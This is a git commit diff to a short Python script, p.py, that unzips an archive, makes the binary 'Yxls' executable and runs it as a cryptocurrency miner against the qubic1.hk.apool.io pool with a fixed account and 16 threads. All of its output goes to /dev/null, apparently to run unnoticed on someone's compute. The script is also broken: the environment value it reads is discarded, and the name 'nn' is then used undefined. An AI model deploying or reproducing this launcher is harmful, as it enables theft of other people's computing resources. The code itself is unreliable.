017cf4d883e063a33146d99ebc4c20057048b72b
SEWDT12 <se12331@outlook.com>
2025-03-22 06:16:39 +0100

    Update p.py

--- p.py
+++ p.py
@@ -1,5 +1,5 @@
 import os
 os.system("unzip Yxls.zip")
-os.system("chmod +x *")
+os.system("chmod +x Yxls")
 os.getenv('nn')
 os.system(f"./Yxls --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {nn} >/dev/null")
